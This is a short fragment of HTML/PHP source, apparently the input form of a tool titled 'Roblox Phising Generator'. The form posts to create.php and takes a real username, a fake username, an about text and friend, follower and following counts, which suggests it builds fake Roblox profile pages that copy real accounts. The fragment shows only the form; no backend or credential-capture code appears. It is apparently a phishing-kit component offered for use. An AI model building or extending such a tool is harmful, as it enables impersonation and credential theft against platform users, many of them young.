...
<form action="create.php" method="post" class="ng-pristine ng-valid">
    <p>Roblox Phising Generator</p>
        ...
        <?php } ?>
    <div class="form">
    <input class="realuser" name="realuser" type="text" placeholder="Username" autocomplete="off" required><br>
    <input class="fakeuser" name="fakeuser" type="text" placeholder="Fake Username" autocomplete="off" required><br>
    <input class="abouts" name="abouts" type="text" placeholder="Abouts" autocomplete="off" required><br>
    <input class="friendcount" name="friendcount" type="text" placeholder="Friend Count" autocomplete="off" required><br>
    <input class="followercount" name="followercount" type="text" placeholder="Follower Count" autocomplete="off" required><br>
    <input class="followingcount" name="followingcount" type="text" placeholder="Following Count" autocomplete="off" required><br>
